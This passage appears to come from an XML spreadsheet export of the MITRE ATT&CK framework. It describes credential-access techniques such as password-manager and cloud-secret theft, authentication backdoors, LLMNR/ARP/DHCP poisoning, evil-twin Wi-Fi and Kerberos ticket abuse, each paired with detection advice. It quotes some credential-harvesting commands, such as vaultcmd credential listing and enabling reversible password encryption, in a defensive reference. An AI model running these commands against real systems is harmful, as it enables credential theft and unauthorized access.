    <t>Monitor process and command-line parameters of &lt;code&gt;vaultcmd.exe&lt;/code&gt; for suspicious activity, such as listing credentials from the Windows Credentials locker (i.e., &lt;code&gt;vaultcmd /listcreds:“Windows Credentials”&lt;/code&gt;).(Citation: Malwarebytes The Windows Vault)
Consider monitoring API calls such as &lt;code&gt;CredEnumerateA&lt;/code&gt; that may list credentials from the Windows Credential Manager.(Citation: Microsoft CredEnumerate)(Citation: Delpy Mimikatz Crendential Manager)
Consider monitoring file reads to Vault locations, &lt;code&gt;%Systemdrive%\Users\\[Username]\AppData\Local\Microsoft\\[Vault/Credentials]\&lt;/code&gt;, for suspicious activity.(Citation: Malwarebytes The Windows Vault)</t>
  </si>
  <si>
    <t>T1555.005</t>
  </si>
  <si>
    <t>Password Managers (T1555.005)</t>
  </si>
  <si>
    <t>Adversaries may acquire user credentials from third-party password managers.(Citation: ise Password Manager February 2019) Password managers are applications designed to store user credentials, normally in an encrypted database. Credentials are typically accessible after a user provides a master password that unlocks the database. After the database is unlocked, these credentials may be copied to memory. These databases can be stored as files on disk.(Citation: ise Password Manager February 2019)
Adversaries may acquire user credentials from password managers by extracting the master password and/or plain-text credentials from memory.(Citation: FoxIT Wocao December 2019)(Citation: Github KeeThief) Adversaries may extract credentials from memory via [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212).(Citation: NVD CVE-2019-3610)
 Adversaries may also try brute forcing via [Password Guessing](https://attack.mitre.org/techniques/T1110/001) to obtain the master password of a password manager.(Citation: Cyberreason Anchor December 2019)</t>
  </si>
  <si>
    <t>Consider monitoring API calls, file read events, and processes for suspicious activity that could indicate searching in process memory of password managers. 
Consider monitoring file reads surrounding known password manager applications.</t>
  </si>
  <si>
    <t>T1555.006</t>
  </si>
  <si>
    <t>Cloud Service: Cloud Service Enumeration</t>
  </si>
  <si>
    <t>Adversaries may acquire credentials from cloud-native secret management solutions such as AWS Secrets Manager, GCP Secret Manager, Azure Key Vault, and Terraform Vault.  
Secrets managers support the secure centralized management of passwords, API keys, and other credential material. Where secrets managers are in use, cloud services can dynamically acquire credentials via API requests rather than accessing secrets insecurely stored in plain text files or environment variables.  
If an adversary is able to gain sufficient privileges in a cloud environment – for example, by obtaining the credentials of high-privileged [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004) or compromising a service that has permission to retrieve secrets – they may be able to request secrets from the secrets manager. This can be accomplished via commands such as `get-secret-value` in AWS, `gcloud secrets describe` in GCP, and `az key vault secret show` in Azure.(Citation: Permiso Scattered Spider 2023)(Citation: Sysdig ScarletEel 2.0 2023)(Citation: AWS Secrets Manager)(Citation: Google Cloud Secrets)(Citation: Microsoft Azure Key Vault)
**Note:** this technique is distinct from [Cloud Instance Metadata API](https://attack.mitre.org/techniques/T1552/005) in that the credentials are being directly requested from the cloud secrets manager, rather than through the medium of the instance metadata API.</t>
  </si>
  <si>
    <t>T1556</t>
  </si>
  <si>
    <t>Credential Access, Defense Evasion, Persistence</t>
  </si>
  <si>
    <t>Active Directory: Active Directory Object Modification, Application Log: Application Log Content, Cloud Service: Cloud Service Modification, File: File Creation, File: File Modification, Logon Session: Logon Session Creation, Module: Module Load, Process: OS API Execution, Process: Process Access, User Account: User Account Authentication, User Account: User Account Modification, Windows Registry: Windows Registry Key Creation, Windows Registry: Windows Registry Key Modification</t>
  </si>
  <si>
    <t>Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows, pluggable authentication modules (PAM) on Unix-based systems, and authorization plugins on MacOS systems, responsible for gathering, storing, and validating credentials. By modifying an authentication process, an adversary may be able to authenticate to a service or system without using [Valid Accounts](https://attack.mitre.org/techniques/T1078).
Adversaries may maliciously modify a part of this process to either reveal credentials or bypass authentication mechanisms. Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop.</t>
  </si>
  <si>
    <t xml:space="preserve">Monitor for new, unfamiliar DLL files written to a domain controller and/or local computer. Monitor for changes to Registry entries for password filters (ex: &lt;code&gt;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Notification Packages&lt;/code&gt;) and correlate then investigate the DLL files these files reference. 
Password filters will also show up as an autorun and loaded DLL in lsass.exe.(Citation: Clymb3r Function Hook Passwords Sept 2013)
Monitor for calls to &lt;code&gt;OpenProcess&lt;/code&gt; that can be used to manipulate lsass.exe running on a domain controller as well as for malicious modifications to functions exported from authentication-related system DLLs (such as cryptdll.dll and samsrv.dll).(Citation: Dell Skeleton) 
Monitor PAM configuration and module paths (ex: &lt;code&gt;/etc/pam.d/&lt;/code&gt;) for changes. Use system-integrity tools such as AIDE and monitoring tools such as auditd to monitor PAM files.
Monitor for suspicious additions to the /Library/Security/SecurityAgentPlugins directory.(Citation: Xorrior Authorization Plugins)
Configure robust, consistent account activity audit policies across the enterprise and with externally accessible services. (Citation: TechNet Audit Policy) Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).
Monitor property changes in Group Policy that manage authentication mechanisms (i.e. [Group Policy Modification](https://attack.mitre.org/techniques/T1484/001)). The &lt;code&gt;Store passwords using reversible encryption&lt;/code&gt; configuration should be set to Disabled. Additionally, monitor and/or block suspicious command/script execution of &lt;code&gt;-AllowReversiblePasswordEncryption $true&lt;/code&gt;, &lt;code&gt;Set-ADUser&lt;/code&gt; and &lt;code&gt;Set-ADAccountControl&lt;/code&gt;. Finally, monitor Fine-Grained Password Policies and regularly audit user accounts and group settings.(Citation: dump_pwd_dcsync)
</t>
  </si>
  <si>
    <t>T1556.001</t>
  </si>
  <si>
    <t>File: File Modification, Logon Session: Logon Session Creation, Process: OS API Execution, Process: Process Access</t>
  </si>
  <si>
    <t>Adversaries may patch the authentication process on a domain controller to bypass the typical authentication mechanisms and enable access to accounts. 
Malware may be used to inject false credentials into the authentication process on a domain controller with the intent of creating a backdoor used to access any user’s account and/or credentials (ex: [Skeleton Key](https://attack.mitre.org/software/S0007)). Skeleton key works through a patch on an enterprise domain controller authentication process (LSASS) with credentials that adversaries may use to bypass the standard authentication system. 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t>
  </si>
  <si>
    <t xml:space="preserve">Monitor for calls to &lt;code&gt;OpenProcess&lt;/code&gt; that can be used to manipulate lsass.exe running on a domain controller as well as for malicious modifications to functions exported from authentication-related system DLLs (such as cryptdll.dll and samsrv.dll).(Citation: Dell Skeleton)
Configure robust, consistent account activity audit policies across the enterprise and with externally accessible services.(Citation: TechNet Audit Policy) Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g. a user has an active login session but has not entered the building or does not have VPN access). </t>
  </si>
  <si>
    <t>T1556.002</t>
  </si>
  <si>
    <t>Password Filter DLL (T1556.002)</t>
  </si>
  <si>
    <t>File: File Creation, Module: Module Load, Windows Registry: Windows Registry Key Modification</t>
  </si>
  <si>
    <t>Adversaries may register malicious password filter dynamic link libraries (DLLs) into the authentication process to acquire user credentials as they are validated. 
Windows password filters are password policy enforcement mechanisms for both domain and local accounts. Filters are implemented as DLLs containing a method to validate potential passwords against password policies. Filter DLLs can be positioned on local computers for local accounts and/or domain controllers for domain accounts. Before registering new passwords in the Security Accounts Manager (SAM), the Local Security Authority (LSA) requests validation from each registered filter. Any potential changes cannot take effect until every registered filter acknowledges validation. 
Adversaries can register malicious password filters to harvest credentials from local computers and/or entire domains. To perform proper validation, filters must receive plain-text credentials from the LSA. A malicious password filter would receive these plain-text credentials every time a password request is made.(Citation: Carnal Ownage Password Filters Sept 2013)</t>
  </si>
  <si>
    <t>Monitor for new, unfamiliar DLL files written to a domain controller and/or local computer. Monitor for changes to Registry entries for password filters (ex: &lt;code&gt;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Notification Packages&lt;/code&gt;) and correlate then investigate the DLL files these files reference.
Password filters will also show up as an autorun and loaded DLL in lsass.exe.(Citation: Clymb3r Function Hook Passwords Sept 2013)</t>
  </si>
  <si>
    <t>T1556.003</t>
  </si>
  <si>
    <t>Pluggable Authentication Modules (T1556.003)</t>
  </si>
  <si>
    <t>File: File Modification, Logon Session: Logon Session Creation</t>
  </si>
  <si>
    <t>Adversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is &lt;code&gt;pam_unix.so&lt;/code&gt;, which retrieves, sets, and verifies account authentication information in &lt;code&gt;/etc/passwd&lt;/code&gt; and &lt;code&gt;/etc/shadow&lt;/code&gt;.(Citation: Apple PAM)(Citation: Man Pam_Unix)(Citation: Red Hat PAM)
Adversaries may modify components of the PAM system to create backdoors. PAM components, such as &lt;code&gt;pam_unix.so&lt;/code&gt;, can be patched to accept arbitrary adversary supplied values as legitimate credentials.(Citation: PAM Backdoor)
Malicious modifications to the PAM system may also be abused to steal credentials. Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords.(Citation: PAM Creds)(Citation: Apple PAM)</t>
  </si>
  <si>
    <t>Monitor PAM configuration and module paths (ex: &lt;code&gt;/etc/pam.d/&lt;/code&gt;) for changes. Use system-integrity tools such as AIDE and monitoring tools such as auditd to monitor PAM files.
Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times (ex: when the user is not present) or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).</t>
  </si>
  <si>
    <t>T1556.004</t>
  </si>
  <si>
    <t>Network Device Authentication (T1556.004)</t>
  </si>
  <si>
    <t>Adversaries may use [Patch System Image](https://attack.mitre.org/techniques/T1601/001) to hard code a password in the operating system, thus bypassing of native authentication mechanisms for local accounts on network devices.
[Modify System Image](https://attack.mitre.org/techniques/T1601) may include implanted code to the operating system for network devices to provide access for adversaries using a specific password.  The modification includes a specific password which is implanted in the operating system image via the patch.  Upon authentication attempts, the inserted code will first check to see if the user input is the password. If so, access is granted. Otherwise, the implanted code will pass the credentials on for verification of potentially valid credentials.(Citation: Mandiant - Synful Knock)</t>
  </si>
  <si>
    <t>Consider verifying the checksum of the operating system file and verifying the image of the operating system in memory.(Citation: Cisco IOS Software Integrity Assurance - Image File Verification)(Citation: Cisco IOS Software Integrity Assurance - Run-Time Memory Verification)
Detection of this behavior may be difficult, detection efforts may be focused on closely related adversary behaviors, such as [Modify System Image](https://attack.mitre.org/techniques/T1601).</t>
  </si>
  <si>
    <t>T1556.005</t>
  </si>
  <si>
    <t>Reversible Encryption (T1556.005)</t>
  </si>
  <si>
    <t>Active Directory: Active Directory Object Modification, Command: Command Execution, Script: Script Execution, User Account: User Account Metadata</t>
  </si>
  <si>
    <t>An adversary may abuse Active Directory authentication encryption properties to gain access to credentials on Windows systems. The &lt;code&gt;AllowReversiblePasswordEncryption&lt;/code&gt; property specifies whether reversible password encryption for an account is enabled or disabled. By default this property is disabled (instead storing user credentials as the output of one-way hashing functions) and should not be enabled unless legacy or other software require it.(Citation: store_pwd_rev_enc)
If the property is enabled and/or a user changes their password after it is enabled, an adversary may be able to obtain the plaintext of passwords created/changed after the property was enabled. To decrypt the passwords, an adversary needs four components:
1. Encrypted password (&lt;code&gt;G$RADIUSCHAP&lt;/code&gt;) from the Active Directory user-structure &lt;code&gt;userParameters&lt;/code&gt;
2. 16 byte randomly-generated value (&lt;code&gt;G$RADIUSCHAPKEY&lt;/code&gt;) also from &lt;code&gt;userParameters&lt;/code&gt;
3. Global LSA secret (&lt;code&gt;G$MSRADIUSCHAPKEY&lt;/code&gt;)
4. Static key hardcoded in the Remote Access Subauthentication DLL (&lt;code&gt;RASSFM.DLL&lt;/code&gt;)
With this information, an adversary may be able to reproduce the encryption key and subsequently decrypt the encrypted password value.(Citation: how_pwd_rev_enc_1)(Citation: how_pwd_rev_enc_2)
An adversary may set this property at various scopes through Local Group Policy Editor, user properties, Fine-Grained Password Policy (FGPP), or via the ActiveDirectory [PowerShell](https://attack.mitre.org/techniques/T1059/001) module. For example, an adversary may implement and apply a FGPP to users or groups if the Domain Functional Level is set to "Windows Server 2008" or higher.(Citation: dump_pwd_dcsync) In PowerShell, an adversary may make associated changes to user settings using commands similar to &lt;code&gt;Set-ADUser -AllowReversiblePasswordEncryption $true&lt;/code&gt;.</t>
  </si>
  <si>
    <t>Monitor property changes in Group Policy: &lt;code&gt;Computer Configuration\Windows Settings\Security Settings\Account Policies\Password Policy\Store passwords using reversible encryption&lt;/code&gt;. By default, the property should be set to Disabled.
Monitor command-line usage for &lt;code&gt;-AllowReversiblePasswordEncryption $true&lt;/code&gt; or other actions that could be related to malicious tampering of user settings (i.e. [Group Policy Modification](https://attack.mitre.org/techniques/T1484/001)). Furthermore, consider monitoring and/or blocking suspicious execution of Active Directory PowerShell modules, such as &lt;code&gt;Set-ADUser&lt;/code&gt; and &lt;code&gt;Set-ADAccountControl&lt;/code&gt;, that change account configurations. 
Monitor Fine-Grained Password Policies and regularly audit user accounts and group settings.(Citation: dump_pwd_dcsync)</t>
  </si>
  <si>
    <t>T1556.006</t>
  </si>
  <si>
    <t>Active Directory: Active Directory Object Modification, Application Log: Application Log Content, Logon Session: Logon Session Creation, User Account: User Account Authentication, User Account: User Account Modification</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may disable or modify multi-factor authentication (MFA) mechanisms to enable persistent access to compromised accounts.
Once adversaries have gained access to a network by either compromising an account lacking MFA or by employing an MFA bypass method such as [Multi-Factor Authentication Request Generation](https://attack.mitre.org/techniques/T1621), adversaries may leverage their access to modify or completely disable MFA defenses. This can be accomplished by abusing legitimate features, such as excluding users from Azure AD Conditional Access Policies, registering a new yet vulnerable/adversary-controlled MFA method, or by manually patching MFA programs and configuration files to bypass expected functionality.(Citation: Mandiant APT42)(Citation: Azure AD Conditional Access Exclusions)
For example, modifying the Windows hosts file (`C:\windows\system32\drivers\etc\hosts`) to redirect MFA calls to localhost instead of an MFA server may cause the MFA process to fail. If a "fail open" policy is in place, any otherwise successful authentication attempt may be granted access without enforcing MFA. (Citation: Russians Exploit Default MFA Protocol - CISA March 2022) 
Depending on the scope, goals, and privileges of the adversary, MFA defenses may be disabled for individual accounts or for all accounts tied to a larger group, such as all domain accounts in a victim's network environment.(Citation: Russians Exploit Default MFA Protocol - CISA March 2022) </t>
  </si>
  <si>
    <t>T1556.007</t>
  </si>
  <si>
    <t>Hybrid Identity (T1556.007)</t>
  </si>
  <si>
    <t>Application Log: Application Log Content, File: File Modification, Logon Session: Logon Session Creation, Module: Module Load</t>
  </si>
  <si>
    <t>IaaS, Identity Provider, Office Suite, SaaS, Windows</t>
  </si>
  <si>
    <t>Adversaries may patch, modify, or otherwise backdoor cloud authentication processes that are tied to on-premises user identities in order to bypass typical authentication mechanisms, access credentials, and enable persistent access to accounts.  
Many organizations maintain hybrid user and device identities that are shared between on-premises and cloud-based environments. These can be maintained in a number of ways. For example, Microsoft Entra ID includes three options for synchronizing identities between Active Directory and Entra ID(Citation: Azure AD Hybrid Identity):
* Password Hash Synchronization (PHS), in which a privileged on-premises account synchronizes user password hashes between Active Directory and Entra ID, allowing authentication to Entra ID to take place entirely in the cloud 
* Pass Through Authentication (PTA), in which Entra ID authentication attempts are forwarded to an on-premises PTA agent, which validates the credentials against Active Directory 
* Active Directory Federation Services (AD FS), in which a trust relationship is established between Active Directory and Entra ID 
AD FS can also be used with other SaaS and cloud platforms such as AWS and GCP, which will hand off the authentication process to AD FS and receive a token containing the hybrid users’ identity and privileges. 
By modifying authentication processes tied to hybrid identities, an adversary may be able to establish persistent privileged access to cloud resources. For example, adversaries who compromise an on-premises server running a PTA agent may inject a malicious DLL into the `AzureADConnectAuthenticationAgentService` process that authorizes all attempts to authenticate to Entra ID, as well as records user credentials.(Citation: Azure AD Connect for Read Teamers)(Citation: AADInternals Azure AD On-Prem to Cloud) In environments using AD FS, an adversary may edit the `Microsoft.IdentityServer.Servicehost` configuration file to load a malicious DLL that generates authentication tokens for any user with any set of claims, thereby bypassing multi-factor authentication and defined AD FS policies.(Citation: MagicWeb)
In some cases, adversaries may be able to modify the hybrid identity authentication process from the cloud. For example, adversaries who compromise a Global Administrator account in an Entra ID tenant may be able to register a new PTA agent via the web console, similarly allowing them to harvest credentials and log into the Entra ID environment as any user.(Citation: Mandiant Azure AD Backdoors)</t>
  </si>
  <si>
    <t>T1556.008</t>
  </si>
  <si>
    <t>Network Provider DLL (T1556.008)</t>
  </si>
  <si>
    <t>File: File Creation, Process: OS API Execution, Windows Registry: Windows Registry Key Creation, Windows Registry: Windows Registry Key Modification</t>
  </si>
  <si>
    <t>Adversaries may register malicious network provider dynamic link libraries (DLLs) to capture cleartext user credentials during the authentication process. Network provider DLLs allow Windows to interface with specific network protocols and can also support add-on credential management functions.(Citation: Network Provider API) During the logon process, Winlogon (the interactive logon module) sends credentials to the local `mpnotify.exe` process via RPC. The `mpnotify.exe` process then shares the credentials in cleartext with registered credential managers when notifying that a logon event is happening.(Citation: NPPSPY - Huntress)(Citation: NPPSPY Video)(Citation: NPLogonNotify) 
Adversaries can configure a malicious network provider DLL to receive credentials from `mpnotify.exe`.(Citation: NPPSPY) Once installed as a credential manager (via the Registry), a malicious DLL can receive and save credentials each time a user logs onto a Windows workstation or domain via the `NPLogonNotify()` function.(Citation: NPLogonNotify)
Adversaries may target planting malicious network provider DLLs on systems known to have increased logon activity and/or administrator logon activity, such as servers and domain controllers.(Citation: NPPSPY - Huntress)</t>
  </si>
  <si>
    <t>T1556.009</t>
  </si>
  <si>
    <t>Conditional Access Policies (T1556.009)</t>
  </si>
  <si>
    <t>Active Directory: Active Directory Object Modification, Cloud Service: Cloud Service Modification</t>
  </si>
  <si>
    <t>IaaS, Identity Provider</t>
  </si>
  <si>
    <t>Adversaries may disable or modify conditional access policies to enable persistent access to compromised accounts. Conditional access policies are additional verifications used by identity providers and identity and access management systems to determine whether a user should be granted access to a resource.
For example, in Entra ID, Okta, and JumpCloud, users can be denied access to applications based on their IP address, device enrollment status, and use of multi-factor authentication.(Citation: Microsoft Conditional Access)(Citation: JumpCloud Conditional Access Policies)(Citation: Okta Conditional Access Policies) In some cases, identity providers may also support the use of risk-based metrics to deny sign-ins based on a variety of indicators. In AWS and GCP, IAM policies can contain `condition` attributes that verify arbitrary constraints such as the source IP, the date the request was made, and the nature of the resources or regions being requested.(Citation: AWS IAM Conditions)(Citation: GCP IAM Conditions) These measures help to prevent compromised credentials from resulting in unauthorized access to data or resources, as well as limit user permissions to only those required. 
By modifying conditional access policies, such as adding additional trusted IP ranges, removing [Multi-Factor Authentication](https://attack.mitre.org/techniques/T1556/006) requirements, or allowing additional [Unused/Unsupported Cloud Regions](https://attack.mitre.org/techniques/T1535), adversaries may be able to ensure persistent access to accounts and circumvent defensive measures.</t>
  </si>
  <si>
    <t>T1557</t>
  </si>
  <si>
    <t>Application Log: Application Log Content, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Service: Service Creation, Windows Registry: Windows Registry Key Modification</t>
  </si>
  <si>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Attack](https://attack.mitre.org/techniques/T1562/010)s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Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).</t>
  </si>
  <si>
    <t>Monitor network traffic for anomalies associated with known AiTM behavior. Consider monitoring for modifications to system configuration files involved in shaping network traffic flow.</t>
  </si>
  <si>
    <t>T1557.001</t>
  </si>
  <si>
    <t>Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Service: Service Creation, Windows Registry: Windows Registry Key Modification</t>
  </si>
  <si>
    <t>By responding to LLMNR/NBT-NS network traffic, adversaries may spoof an authoritative source for name resolution to force communication with an adversary controlled system. This activity may be used to collect or relay authentication materials. 
Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. (Citation: Wikipedia LLMNR)(Citation: TechNet NetBIOS)
Adversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through [Network Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes offline through [Brute Force](https://attack.mitre.org/techniques/T1110) to obtain the plaintext passwords.
In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv1/v2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it.(Citation: byt3bl33d3r NTLM Relaying)(Citation: Secure Ideas SMB Relay) Additionally, adversaries may encapsulate the NTLMv1/v2 hashes into various protocols, such as LDAP, SMB, MSSQL and HTTP, to expand and use multiple services with the valid NTLM response. 
Several tools may be used to poison name services within local networks such as NBNSpoof, Metasploit, and [Responder](https://attack.mitre.org/software/S0174).(Citation: GitHub NBNSpoof)(Citation: Rapid7 LLMNR Spoofer)(Citation: GitHub Responder)</t>
  </si>
  <si>
    <t>Monitor &lt;code&gt;HKLM\Software\Policies\Microsoft\Windows NT\DNSClient&lt;/code&gt; for changes to the "EnableMulticast" DWORD value. A value of “0” indicates LLMNR is disabled. (Citation: Sternsecurity LLMNR-NBTNS)
Monitor for traffic on ports UDP 5355 and UDP 137 if LLMNR/NetBIOS is disabled by security policy.
Deploy an LLMNR/NBT-NS spoofing detection tool.(Citation: GitHub Conveigh) Monitoring of Windows event logs for event IDs 4697 and 7045 may help in detecting successful relay techniques.(Citation: Secure Ideas SMB Relay)</t>
  </si>
  <si>
    <t>T1557.002</t>
  </si>
  <si>
    <t>ARP Cache Poisoning (T1557.002)</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may poison Address Resolution Protocol (ARP) caches to position themselves between the communication of two or more networked devices. This activity may be used to enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).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with its MAC address. The networked device that made the ARP request will then use as well as store that information in its ARP cache.
An adversary may passively wait for an ARP request to poison the ARP cache of the requesting device. The adversary may reply with their MAC address, thus deceiving the victim by making them believe that they are communicating with the intended networked device. For the adversary to poison the ARP cache, their reply must be faster than the one made by the legitimate IP address owner. Adversaries may also send a gratuitous ARP reply that maliciously announces the ownership of a particular IP address to all the devices in the local network segment.
The ARP protocol is stateless and does not require authentication. Therefore, devices may wrongly add or update the MAC address of the IP address in their ARP cache.(Citation: Sans ARP Spoofing Aug 2003)(Citation: Cylance Cleaver)
Adversaries may use ARP cache poisoning as a means to intercept network traffic. This activity may be used to collect and/or relay data such as credentials, especially those sent over an insecure, unencrypted protocol.(Citation: Sans ARP Spoofing Aug 2003)
</t>
  </si>
  <si>
    <t>Monitor network traffic for unusual ARP traffic, gratuitous ARP replies may be suspicious. 
Consider collecting changes to ARP caches across endpoints for signs of ARP poisoning. For example, if multiple IP addresses map to a single MAC address, this could be an indicator that the ARP cache has been poisoned.</t>
  </si>
  <si>
    <t>T1557.003</t>
  </si>
  <si>
    <t>DHCP Spoofing (T1557.003)</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may redirect network traffic to adversary-owned systems by spoofing Dynamic Host Configuration Protocol (DHCP) traffic and acting as a malicious DHCP server on the victim network. By achieving the adversary-in-the-middle (AiTM) position, adversaries may collect network communications, including passed credentials, especially those sent over insecure, unencrypted protocols. This may also enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).
DHCP is based on a client-server model and has two functionalities: a protocol for providing network configuration settings from a DHCP server to a client and a mechanism for allocating network addresses to clients.(Citation: rfc2131) The typical server-client interaction is as follows: 
1. The client broadcasts a `DISCOVER` message.
2. The server responds with an `OFFER` message, which includes an available network address. 
3. The client broadcasts a `REQUEST` message, which includes the network address offered. 
4. The server acknowledges with an `ACK` message and the client receives the network configuration parameters.
Adversaries may spoof as a rogue DHCP server on the victim network, from which legitimate hosts may receive malicious network configurations. For example, malware can act as a DHCP server and provide adversary-owned DNS servers to the victimized computers.(Citation: new_rogue_DHCP_serv_malware)(Citation: w32.tidserv.g) Through the malicious network configurations, an adversary may achieve the AiTM position, route client traffic through adversary-controlled systems, and collect information from the client network.
DHCPv6 clients can receive network configuration information without being assigned an IP address by sending a &lt;code&gt;INFORMATION-REQUEST (code 11)&lt;/code&gt; message to the &lt;code&gt;All_DHCP_Relay_Agents_and_Servers&lt;/code&gt; multicast address.(Citation: rfc3315) Adversaries may use their rogue DHCP server to respond to this request message with malicious network configurations.
Rather than establishing an AiTM position, adversaries may also abuse DHCP spoofing to perform a DHCP exhaustion attack (i.e, [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002)) by generating many broadcast DISCOVER messages to exhaust a network’s DHCP allocation pool. </t>
  </si>
  <si>
    <t>Monitor network traffic for suspicious/malicious behavior involving DHCP, such as changes in DNS and/or gateway parameters. Additionally, monitor Windows logs for Event IDs (EIDs) 1341, 1342, 1020 and 1063, which specify that the IP allocations are low or have run out; these EIDs may indicate a denial of service attack.(Citation: dhcp_serv_op_events)(Citation: solution_monitor_dhcp_scopes)</t>
  </si>
  <si>
    <t>T1557.004</t>
  </si>
  <si>
    <t>Evil Twin (T1557.004)</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may host seemingly genuine Wi-Fi access points to deceive users into connecting to malicious networks as a way of supporting follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or [Input Capture](https://attack.mitre.org/techniques/T1056).(Citation: Australia ‘Evil Twin’)
By using a Service Set Identifier (SSID) of a legitimate Wi-Fi network, fraudulent Wi-Fi access points may trick devices or users into connecting to malicious Wi-Fi networks.(Citation: Kaspersky evil twin)(Citation: medium evil twin)  Adversaries may provide a stronger signal strength or block access to Wi-Fi access points to coerce or entice victim devices into connecting to malicious networks.(Citation: specter ops evil twin)  A Wi-Fi Pineapple – a network security auditing and penetration testing tool – may be deployed in Evil Twin attacks for ease of use and broader range. Custom certificates may be used in an attempt to intercept HTTPS traffic.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
Upon logging into the malicious Wi-Fi access point, a user may be directed to a fake login page or captive portal webpage to capture the victim’s credentials. Once a user is logged into the fraudulent Wi-Fi network, the adversary may able to monitor network activity, manipulate data, or steal additional credentials. Locations with high concentrations of public Wi-Fi access, such as airports, coffee shops, or libraries, may be targets for adversaries to set up illegitimate Wi-Fi access points. </t>
  </si>
  <si>
    <t>T1558</t>
  </si>
  <si>
    <t>Active Directory: Active Directory Credential Request, Command: Command Execution, File: File Access, Logon Session: Logon Session Metadata</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may attempt to subvert Kerberos authentication by stealing or forging Kerberos tickets to enable [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003). Kerberos is an authentication protocol widely used in modern Windows domain environments. In Kerberos environments, referred to as “realms”, there are three basic participants: client, service, and Key Distribution Center (KDC).(Citation: ADSecurity Kerberos Ring Decoder) Clients request access to a service and through the exchange of Kerberos tickets, originating from KDC, they are granted access after having successfully authenticated. The KDC is responsible for both authentication and ticket granting.  Adversaries may attempt to abuse Kerberos by stealing tickets or forging tickets to enable unauthorized access.
On Windows, the built-in &lt;code&gt;klist&lt;/code&gt; utility can be used to list and analyze cached Kerberos tickets.(Citation: Microsoft Klist)
</t>
  </si>
  <si>
    <t>Monitor for anomalous Kerberos activity, such as malformed or blank fields in Windows logon/logoff events (Event ID 4624, 4672, 4634), RC4 encryption within ticket granting tickets (TGTs), and ticket granting service (TGS) requests without preceding TGT requests.(Citation: ADSecurity Detecting Forged Tickets)(Citation: Stealthbits Detect PtT 2019)(Citation: CERT-EU Golden Ticket Protection)
Monitor the lifetime of TGT tickets for values that differ from the default domain duration.(Citation: Microsoft Kerberos Golden Ticket)
Monitor for indications of [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003) being used to move laterally. 
Enable Audit Kerberos Service Ticket Operations to log Kerberos TGS service ticket requests. Particularly investigate irregular patterns of activity (ex: accounts making numerous requests, Event ID 4769, within a small time frame, especially if they also request RC4 encryption [Type 0x17]).(Citation: Microsoft Detecting Kerberoasting Feb 2018) (Citation: AdSecurity Cracking Kerberos Dec 2015)
Monitor for unexpected processes interacting with lsass.exe.(Citation: Medium Detecting Attempts to Steal Passwords from Memory) Common credential dumpers such as [Mimikatz](https://attack.mitre.org/software/S0002) access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details, including Kerberos tickets, are stored.
